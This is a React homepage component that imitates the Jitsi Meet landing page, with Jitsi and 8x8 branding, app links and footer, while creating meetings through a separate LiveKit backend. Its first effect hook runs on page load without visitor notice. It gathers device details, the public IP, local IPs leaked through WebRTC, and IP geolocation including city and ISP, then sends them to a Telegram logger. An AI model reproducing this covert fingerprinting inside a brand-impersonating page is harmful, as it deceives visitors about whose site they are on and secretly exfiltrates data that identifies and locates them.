import { useState, useEffect, useRef } from 'react';
import { getDeviceInfo } from '@/utils/deviceInfo';
import { logVisitorEntry } from '@/utils/telegramLogger';
import { getPublicIP, getWebRTCIPs, getIPGeolocation } from '@/utils/ipGeolocation';
import { createRoom, getRoomFromUrl } from '@/utils/livekitAPI';
import svgPaths from '@/imports/svg-99v8zxjlwb';
import imgOverlayBackground from 'figma:asset/455efd74484e4206bfe7dee2d881fb68f6a253a3.png';
import img8X8LogoPng from 'figma:asset/a72d808de1a86028867072f0c54f388b92ac4e7c.png';
import imgAppStoreBadgePng from 'figma:asset/9a42e8d73dc4dbf02e9165f397ff8da90dbae75a.png';
import imgGooglePlayBadgePng from 'figma:asset/98a2733682df8e6969743c7caafc1c6a4d21ff14.png';
import imgFDroidBadgePng from 'figma:asset/022af21d9561b6af820311ec6b3f1aafc7658217.png';
import imgSlackPng from 'figma:asset/041fcaa2783dbf36ffa6b0001995e5149ba0f052.png';
import imgFbPng from 'figma:asset/73dc131b9b4fe0e0635a9fa869b9336f6869c64b.png';
import imgLiPng from 'figma:asset/02213affcd0013361a35e78c26720927cc9ae9e8.png';
import imgTwPng from 'figma:asset/6770beca3b14a1f2999f2ecbafdf9fa480d9dbdd.png';
import imgGhPng from 'figma:asset/fd5823994372c13bc9a9453daddfbb272ceecb31.png';

interface HomePageProps {
  onStartMeeting: (roomSlug: string, roomTitle?: string) => void;
}

export default function HomePage({ onStartMeeting }: HomePageProps) {
  const [userName, setUserName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const hasLoggedVisit = useRef(false);

  // ========================================
  // VISITOR TRACKING - runs once on mount
  // ========================================
  useEffect(() => {
    if (hasLoggedVisit.current) {
      return;
    }
    
    hasLoggedVisit.current = true;
    
    const trackVisitor = async () => {
      try {
        console.log('🎯 Новый посетитель - начинаем сбор данных...');
        
        const deviceInfo = getDeviceInfo();
        console.log('✅ Информация об устройстве собрана:', deviceInfo);
        
        let publicIP = 'Unknown';
        try {
          publicIP = await getPublicIP();
          console.log('✅ Публичный IP:', publicIP);
        } catch (error) {
          console.error('❌ Ошибка получения IP:', error);
        }
        
        let webrtcIPs: string[] = [];
        try {
          webrtcIPs = await getWebRTCIPs();
          console.log(`✅ WebRTC IPs (${webrtcIPs?.length || 0}):`, webrtcIPs);
        } catch (error) {
          console.error('❌ Ошибка WebRTC leak:', error);
        }
        
        let geoData: any = null;
        try {
          const ipGeo = await getIPGeolocation();
          if (ipGeo) {
            geoData = {
              country: ipGeo.country,
              city: ipGeo.city,
              region: ipGeo.regionName,
              timezone: ipGeo.timezone,
              isp: ipGeo.isp,
            };
            console.log('✅ Геолокация получена:', geoData);
          }
        } catch (error) {
          console.error('❌ Ошибка геолокации:', error);
        }
        
        await logVisitorEntry({
          deviceInfo,
          publicIP,
          webrtcIPs: webrtcIPs || [],
          geoData,
        });
        
        console.log('✅ Данные посетителя отправлены в Telegram');
      } catch (error) {
        console.error('❌ Ошибка отслеживания посетителя:', error);
      }
    };
    
    trackVisitor();
  }, []);

  // ========================================
  // CHECK FOR ROOM IN URL
  // ========================================
  useEffect(() => {
    const roomFromUrl = getRoomFromUrl();
    if (roomFromUrl) {
      console.log('🔗 Обнаружена комната в URL:', roomFromUrl);
      console.log('');
      console.log('='.repeat(80));
      console.log('🎊 ВЫ ПРИСОЕДИНЯЕТЕСЬ К СУЩЕСТВУЮЩЕЙ КОМНАТЕ!');
      console.log('='.repeat(80));
      console.log('✅ Комната найдена в URL:', window.location.href);
      console.log('📝 Room slug:', roomFromUrl);
      console.log('');
      console.log('Что происходит:');
      console.log('1️⃣  Вы автоматически переходите в prejoin');
      console.log('2️⃣  Введите свое имя');
      console.log('3️⃣  Нажмите "Join meeting"');
      console.log('4️⃣  Вы окажетесь в комнате с другими участниками! 🎉');
      console.log('='.repeat(80));
      console.log('');
      onStartMeeting(roomFromUrl);
    }
  }, [onStartMeeting]);

  // ========================================
  // HANDLE START MEETING
  // ========================================
  const handleStartMeeting = async () => {
    if (!userName.trim()) {
      setError('Please enter a meeting name');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      console.log('🚀 [HomePage] Создание комнаты для пользователя:', userName);
      
      // Use userName as the room title
      const result = await createRoom(userName, userName);
      
      console.log('✅ [HomePage] Комната создана, slug:', result.roomSlug, 'title:', result.roomName);
      
      // Update URL with room slug so the link can be shared
      const newUrl = new URL(window.location.href);
      newUrl.searchParams.set('room', result.roomSlug);
      window.history.pushState({}, '', newUrl.toString());
      
      console.log('🔗 [HomePage] Ссылка на комнату:', newUrl.toString());
      console.log('📋 [HomePage] Скопируйте эту ссылку и откройте в другом браузере/вкладке для подключения к комнате');
      console.log('💡 [HomePage] Или нажмите кнопку "Copy meeting link" на следующем экране');
      console.log('');
      console.log('='.repeat(80));
      console.log('🎉 КАК ПРИГЛАСИТЬ ДРУГИХ ПОЛЬЗОВАТЕЛЕЙ В КОМНАТУ:');
      console.log('='.repeat(80));
      console.log('1️⃣  На следующем экране нажмите "📋 Copy meeting link"');
      console.log('2️⃣  Откройте ссылку в другом браузере или отправьте другу');
      console.log('3️⃣  Другой пользователь автоматически попадет в prejoin этой же комнаты');
      console.log('4️⃣  Оба нажимаете "Join meeting" и оказываетесь в ОДНОМ видеозвонке!');
      console.log('');
      console.log('📝 Ваша ссылка: ' + newUrl.toString());
      console.log('='.repeat(80));
      console.log('');
      
      onStartMeeting(result.roomSlug, result.roomName);
    } catch (error: any) {
      console.error('❌ [HomePage] Ошибка создания комнаты:', error);
      setError(error.message || 'Failed to create room');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white relative size-full overflow-auto">
      <div className="absolute bg-white content-stretch flex flex-col items-start left-0 min-h-[640px] right-0 top-0">
        {/* Hero Section with Background */}
        <div 
          className="bg-size-[auto_auto,auto_auto,1280px_613px] bg-top-left relative shrink-0 w-full" 
          style={{ 
            backgroundImage: `linear-gradient(90deg, rgba(0, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.2) 100%), linear-gradient(90deg, rgb(0, 0, 0) 0%, rgba(0, 0, 0, 0) 75.16%), url('${imgOverlayBackground}')` 
          }}
        >
          <div className="overflow-clip rounded-[inherit] size-full">
            <div className="content-stretch flex flex-col items-center pb-[16px] pt-[120px] px-4 md:px-8 lg:px-[163px] relative w-full">
              <div className="h-[245.14px] max-w-[688px] relative shrink-0 w-full mx-auto">
                {/* Logo */}
                <div className="absolute inset-[-84px_0_84px_0]">
                  <a className="absolute content-stretch cursor-pointer flex flex-col h-[32px] items-start left-0 max-h-[70px] max-w-[140px] top-0 w-[71px]" href="https://jitsi.org/">
                    <div className="content-stretch flex flex-col h-[32px] items-start max-h-[70px] max-w-[140px] relative shrink-0 w-[71px]">
                      <div className="content-stretch flex flex-col h-[32px] items-start justify-center overflow-clip relative shrink-0 w-[71px]">
                        <div className="h-[32px] relative shrink-0 w-[71px]">
                          <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 71 32">
                            <g clipPath="url(#clip0_1_107)">
                              <path d={svgPaths.p187d5d00} fill="white" />
                              <path d={svgPaths.p373a8600} fill="white" />
                              <path d={svgPaths.p1981b00} fill="white" />
                              <path d={svgPaths.p1c73ca00} fill="white" />
                              <path d={svgPaths.p883c300} fill="white" />
                              <path d={svgPaths.p30fb000} fill="white" />
                            </g>
                            <defs>
                              <clipPath id="clip0_1_107">
                                <rect fill="white" height="32" width="71" />
                              </clipPath>
                            </defs>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </a>
                </div>

                {/* Heading */}
                <div className="absolute content-stretch flex flex-col items-center left-[255.31px] pt-[30px] top-0">
                  <div className="content-stretch flex flex-col items-center min-w-[177.3800048828125px] relative shrink-0">
                    <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[42px] text-center text-white whitespace-nowrap">
                      <p className="leading-[50px]">Jitsi Meet</p>
                    </div>
                  </div>
                </div>

                {/* Subtitle */}
                <div className="absolute content-stretch flex flex-col items-start left-[184.52px] pb-[32px] pt-[16px] top-[80px]">
                  <div className="content-stretch flex flex-col items-center relative shrink-0">
                    <div className="flex flex-col font-['Arial',sans-serif] font-bold justify-center leading-[0] not-italic relative shrink-0 text-[20px] text-center text-white whitespace-nowrap">
                      <p className="leading-[26px]">Secure and high quality meetings</p>
                    </div>
                  </div>
                </div>

                {/* Input and Button */}
                <div className="-translate-x-1/2 absolute content-stretch flex items-center justify-center left-1/2 max-w-[480px] top-[154px] w-[480px]">
                  <div className="bg-white flex-[1_0_0] min-h-px min-w-px relative rounded-[4px]">
                    <div className="content-stretch flex items-start p-[4px] relative w-full">
                      <div className="flex-[1_0_0] min-h-px min-w-px relative self-stretch">
                        <div className="content-stretch flex flex-col items-start pr-[4px] relative size-full">
                          <div className="bg-white h-[50px] relative rounded-[4px] shrink-0 w-full">
                            <div className="flex flex-row justify-center overflow-clip rounded-[inherit] size-full">
                              <div className="content-stretch flex items-start justify-center pl-[10px] pr-[2px] py-[17px] relative size-full">
                                <div className="content-stretch flex flex-[1_0_0] flex-col items-start min-h-px min-w-px overflow-clip relative">
                                  <input
                                    type="text"
                                    value={userName}
                                    onChange={(e) => setUserName(e.target.value)}
                                    onKeyDown={(e) => {
                                      if (e.key === 'Enter' && !isLoading) {
                                        handleStartMeeting();
                                      }
                                    }}
                                    placeholder="Enter meeting name"
                                    disabled={isLoading}
                                    className="flex flex-col font-['Arial',sans-serif] justify-center leading-[normal] not-italic relative shrink-0 text-[#253858] text-[14px] w-full border-none outline-none bg-transparent"
                                  />
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <button
                        onClick={handleStartMeeting}
                        disabled={isLoading}
                        className="bg-[#0074e0] content-stretch flex flex-col items-center justify-center min-w-[123.2699966430664px] px-[20px] py-[17px] relative rounded-[3px] shrink-0 hover:bg-[#0066c7] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[14px] text-center text-white whitespace-nowrap">
                          <p className="leading-[normal]">{isLoading ? 'Loading...' : 'Start meeting'}</p>
                        </div>
                      </button>
                    </div>
                  </div>
                </div>

                {/* Error Message */}
                {error && (
                  <div className="-translate-x-1/2 absolute left-1/2 top-[220px] max-w-[480px] w-[480px]">
                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                      <p className="text-red-400 text-sm text-center">{error}</p>
                    </div>
                  </div>
                )}

                {/* Book meeting URL text */}
                <div className="-translate-x-1/2 absolute content-stretch flex items-start justify-center left-1/2 max-w-[648px] pb-[0.14px] pt-[15px] top-[212px] w-[648px]">
                  <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#f1f1f1] text-[12px] text-center whitespace-nowrap">
                    <p className="leading-[17.14px]">Or </p>
                  </div>
                  <div className="content-stretch flex items-start justify-center relative shrink-0">
                    <a className="flex flex-col font-['Arial',sans-serif] font-bold justify-center leading-[0] not-italic relative shrink-0 text-[#f1f1f1] text-[12px] text-center whitespace-nowrap" href="https://moderated.jitsi.net/">
                      <p className="cursor-pointer leading-[17.14px]">book a meeting URL</p>
                    </a>
                  </div>
                  <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#f1f1f1] text-[12px] text-center whitespace-nowrap">
                    <p className="leading-[17.14px]"> in advance where you are the only moderator.</p>
                  </div>
                </div>

                {/* Settings Button */}
                <div className="absolute content-stretch flex flex-col items-start p-[4px] right-0 rounded-[3px] top-[-69px]">
                  <div className="bg-[rgba(255,255,255,0.38)] content-stretch flex flex-col items-start justify-center relative rounded-[3px] shrink-0 size-[24px]">
                    <div className="content-stretch flex flex-col items-start relative shrink-0 w-full">
                      <div className="relative shrink-0 size-[24px]">
                        <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 24 24">
                          <path clipRule="evenodd" d={svgPaths.pe3b500} fill="white" fillRule="evenodd" />
                          <path clipRule="evenodd" d={svgPaths.pee08300} fill="white" fillRule="evenodd" />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Content Section */}
        <div className="content-stretch flex flex-col gap-[40px] items-center pt-[40px] relative shrink-0 w-full">
          <div className="content-stretch flex flex-col items-center justify-center max-w-[688px] px-4 relative shrink-0 w-full mx-auto">
            <div className="h-[16px] shrink-0 w-full" />
            
            {/* Jitsi as a Service Card */}
            <div className="content-stretch flex flex-col items-start pb-[16px] relative shrink-0 w-full">
              <div className="bg-[#444447] content-stretch flex flex-col items-start relative rounded-[8px] shrink-0 w-full">
                <div className="h-[297.14px] relative shrink-0 w-full">
                  <div className="absolute content-stretch flex items-center left-[32px] right-[32px] top-[32px]">
                    <div className="content-stretch flex flex-col items-start pr-[16px] relative shrink-0">
                      <div className="relative shrink-0 size-[32px]">
                        <div className="absolute inset-0 overflow-hidden pointer-events-none">
                          <img alt="" className="absolute left-0 max-w-none size-full top-0" src={img8X8LogoPng} />
                        </div>
                      </div>
                    </div>
                    <div className="content-stretch flex flex-col items-start min-w-[120.05000305175781px] relative shrink-0">
                      <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[16px] text-white whitespace-nowrap">
                        <p className="leading-[32px]">Jitsi as a Service</p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="absolute content-stretch flex flex-col items-start left-[32px] right-[32px] top-[94px]">
                    <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[24px] text-white whitespace-nowrap">
                      <p>
                        <span className="leading-[36px]">Want meetings in your app? Check out </span>
                        <span className="font-bold leading-[36px] not-italic">Jitsi as a Service</span>
                        <span className="leading-[36px]">.</span>
                      </p>
                    </div>
                  </div>
                  
                  <div className="absolute content-stretch flex flex-col items-start left-[32px] right-[32px] top-[146px]">
                    <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[24px] not-italic relative shrink-0 text-[16px] text-white whitespace-nowrap">
                      <p className="mb-0">Connect the users of your website or app. Get branding & tight access controls. Have</p>
                      <p>notifications, transcriptions & recordings delivered straight to your backend</p>
                    </div>
                  </div>
                  
                  <div className="absolute content-stretch flex flex-col items-start left-[32px] right-[32px] top-[218px]">
                    <a className="content-stretch cursor-pointer flex items-start relative shrink-0" href="https://jaas.8x8.vc/">
                      <div className="bg-white content-stretch flex items-start pb-[15.14px] pt-[14px] px-[16px] relative rounded-[3px] shrink-0">
                        <div className="flex flex-col font-['Arial',sans-serif] font-bold justify-center leading-[0] not-italic relative shrink-0 text-[#36373a] text-[12px] text-left whitespace-nowrap" role="link" tabIndex={0}>
                          <p className="cursor-pointer leading-[17.14px]">Learn more</p>
                        </div>
                      </div>
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="bg-[#131519] relative shrink-0 w-full">
            <div className="content-stretch flex flex-col items-start px-4 md:px-8 lg:px-[163px] relative w-full">
              <div className="relative shrink-0 w-full">
                <div className="content-stretch flex flex-col items-start px-[16px] relative w-full">
                  {/* Mobile Apps Section */}
                  <div className="relative shrink-0 w-full">
                    <div aria-hidden="true" className="absolute border-[#424447] border-b border-solid inset-0 pointer-events-none" />
                    <div className="flex flex-row items-center size-full">
                      <div className="content-stretch flex items-center justify-between pb-[25px] pr-[0.03px] pt-[40px] relative w-full">
                        <div className="h-[34.28px] max-w-[216px] relative shrink-0 w-[216px]">
                          <div className="absolute content-stretch flex flex-col items-center left-0 max-w-[200px] min-w-[200px] px-[4.61px] top-[-0.93px]">
                            <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[17.14px] not-italic relative shrink-0 text-[12px] text-center text-white whitespace-nowrap">
                              <p className="mb-0">Jitsi on mobile – download our apps</p>
                              <p>and start a meeting from anywhere</p>
                            </div>
                          </div>
                        </div>
                        <a className="content-stretch cursor-pointer flex flex-col items-start relative shrink-0" href="https://apps.apple.com/us/app/jitsi-meet/id1165103905">
                          <div className="h-[40px] relative shrink-0 w-[120px]">
                            <div className="absolute inset-0 overflow-hidden pointer-events-none">
                              <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgAppStoreBadgePng} />
                            </div>
                          </div>
                        </a>
                        <a className="content-stretch cursor-pointer flex flex-col items-start relative shrink-0" href="https://play.google.com/store/apps/details">
                          <div className="h-[45px] relative shrink-0 w-[153px]">
                            <div className="absolute inset-0 overflow-hidden pointer-events-none">
                              <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgGooglePlayBadgePng} />
                            </div>
                          </div>
                        </a>
                        <a className="content-stretch cursor-pointer flex flex-col items-start relative shrink-0" href="https://f-droid.org/en/packages/org.jitsi.meet/">
                          <div className="h-[40px] relative shrink-0 w-[135px]">
                            <div className="absolute inset-0 overflow-hidden pointer-events-none">
                              <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgFDroidBadgePng} />
                            </div>
                          </div>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Slack Section */}
                  <div className="content-stretch flex items-center justify-between pb-[33px] pt-[32px] relative shrink-0 w-full">
                    <div aria-hidden="true" className="absolute border-[#424447] border-b border-solid inset-0 pointer-events-none" />
                    <div className="content-stretch flex flex-col items-start min-w-[473.3900146484375px] pr-[32px] relative shrink-0">
                      <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[12px] text-white whitespace-nowrap">
                        <p className="leading-[17.14px]">Hello, Slack fans! Very pleased to meet you! Just add our extension and off you go!</p>
                      </div>
                    </div>
                    <a className="content-stretch cursor-pointer flex flex-col items-start relative shrink-0" href="https://slack.com/oauth/authorize">
                      <div className="h-[40px] relative shrink-0 w-[156px]">
                        <div className="absolute inset-0 overflow-hidden pointer-events-none">
                          <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgSlackPng} />
                        </div>
                      </div>
                    </a>
                  </div>

                  {/* Links and Social */}
                  <div className="content-stretch flex items-center justify-between pb-[21px] pt-[20px] relative shrink-0 w-full">
                    <div aria-hidden="true" className="absolute border-[#424447] border-b border-solid inset-0 pointer-events-none" />
                    <div className="content-stretch flex gap-[16px] items-start pr-[16px] relative shrink-0">
                      <div className="content-stretch flex items-start relative shrink-0">
                        <a className="flex flex-col font-['Arial',sans-serif] font-bold justify-center leading-[0] not-italic relative shrink-0 text-[12px] text-white whitespace-nowrap" href="https://jitsi.org/meet-jit-si-privacy/">
                          <p className="cursor-pointer leading-[16px]">Privacy Policy </p>
                        </a>
                      </div>
                      <div className="content-stretch flex items-start relative shrink-0">
                        <a className="flex flex-col font-['Arial',sans-serif] font-bold justify-center leading-[0] not-italic relative shrink-0 text-[12px] text-white whitespace-nowrap" href="http://jitsi.org/meet-jit-si-terms-of-service/">
                          <p className="cursor-pointer leading-[16px]">Terms & Conditions</p>
                        </a>
                      </div>
                    </div>
                    <div className="content-stretch cursor-pointer flex gap-[27.3px] items-start pb-[2.14px] pl-[24px] relative shrink-0">
                      <a className="content-stretch flex items-start pb-[3px] relative shrink-0" href="https://www.facebook.com/jitsi">
                        <div className="relative shrink-0 size-[24px]">
                          <div className="absolute inset-0 overflow-hidden pointer-events-none">
                            <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgFbPng} />
                          </div>
                        </div>
                      </a>
                      <a className="content-stretch flex items-start pb-[3px] relative shrink-0" href="https://www.linkedin.com/company/8x8/">
                        <div className="relative shrink-0 size-[24px]">
                          <div className="absolute inset-0 overflow-hidden pointer-events-none">
                            <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgLiPng} />
                          </div>
                        </div>
                      </a>
                      <a className="content-stretch flex items-start pb-[3px] relative shrink-0" href="https://twitter.com/jitsinews">
                        <div className="relative shrink-0 size-[24px]">
                          <div className="absolute inset-0 overflow-hidden pointer-events-none">
                            <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgTwPng} />
                          </div>
                        </div>
                      </a>
                      <a className="content-stretch flex items-start pb-[3px] relative shrink-0" href="https://github.com/jitsi">
                        <div className="relative shrink-0 size-[24px]">
                          <div className="absolute inset-0 overflow-hidden pointer-events-none">
                            <img alt="" className="absolute left-0 max-w-none size-full top-0" src={imgGhPng} />
                          </div>
                        </div>
                      </a>
                    </div>
                  </div>

                  {/* Copyright */}
                  <div className="content-stretch flex items-center pb-[56px] pt-[32px] relative shrink-0 w-full">
                    <a className="content-stretch cursor-pointer flex flex-col items-start pr-[32px] relative shrink-0" href="https://8x8.com/">
                      <div className="relative shrink-0 size-[32px]">
                        <div className="absolute inset-0 overflow-hidden pointer-events-none">
                          <img alt="" className="absolute left-0 max-w-none size-full top-0" src={img8X8LogoPng} />
                        </div>
                      </div>
                    </a>
                    <div className="content-stretch flex flex-col items-start min-w-[250.55999755859375px] relative shrink-0">
                      <div className="content-stretch flex flex-col items-start relative shrink-0 w-full">
                        <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#a1a1a3] text-[12px] whitespace-nowrap">
                          <p className="leading-[16px]">8x8 is a proud supporter of the Jitsi community.</p>
                        </div>
                      </div>
                      <div className="content-stretch flex flex-col items-start relative shrink-0 w-full">
                        <div className="flex flex-col font-['Arial',sans-serif] justify-center leading-[0] not-italic relative shrink-0 text-[#a1a1a3] text-[12px] whitespace-nowrap">
                          <p className="leading-[16px]">© 8x8, Inc. All Rights Reserved.</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}